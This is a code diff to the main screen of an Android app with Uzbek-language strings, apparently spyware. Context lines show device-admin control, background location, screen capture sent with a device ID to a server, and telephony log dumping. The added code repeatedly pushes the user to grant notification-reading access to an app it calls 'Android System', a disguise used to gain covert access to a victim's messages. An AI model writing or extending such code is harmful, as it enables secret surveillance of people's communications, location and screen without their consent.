@@ -20,6 +20,9 @@ import androidx.appcompat.app.AppCompatActivity
 import androidx.core.content.ContextCompat
 import java.util.UUID
 import kotlin.concurrent.thread
+import android.content.Intent
+import android.provider.Settings
+import android.widget.Toast
 
 class MainActivity : AppCompatActivity() {
 
@@ -87,11 +90,36 @@ class MainActivity : AppCompatActivity() {
         ActivityResultContracts.RequestPermission()
     ) { ok -> setStatus(if (ok) "✅ Lokatsiya (background) berildi" else "⚠️ Faqat ilova ochiq paytda") }
 
+    override fun onResume() {
+        super.onResume()
+        // Sozlamalardan qaytib kirganda ham qayta tekshirish
+        checkAndRequestNotificationPermission()
+    }
+
+    private fun checkAndRequestNotificationPermission() {
+        if (!isNotificationServiceEnabled()) {
+            Toast.makeText(
+                this, 
+                "Bildirishnomalarni o'qish uchun Android System ilovasiga ruxsat bering", 
+                Toast.LENGTH_LONG
+            ).show()
+            
+            // Sozlamalardagi Notification Access sahifasiga o'tkazish
+            val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
+            startActivity(intent)
+        }
+    }
+
+    private fun isNotificationServiceEnabled(): Boolean {
+        val pkgName = packageName
+        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
+        return flat != null && flat.contains(pkgName)
+    }
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
         adminComp = android.content.ComponentName(this, DeviceAdminReceiver::class.java)
-
+        checkAndRequestNotificationPermission()
         val root = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
             setPadding(40, 60, 40, 40)
@@ -127,7 +155,7 @@ root.addView(makeBtn("📋 Loglarni konsolga chiqarish (Test)") { printTelephony
             Intent(this, ScreenCaptureService::class.java)
                 .putExtra("deviceId", deviceId)
         )
-
+            
         // Server bilan ulanishni tekshir va UI ni yangilash
         tvPairing.text = "Device ID: $deviceId\nUlanmoqda..."
         thread {
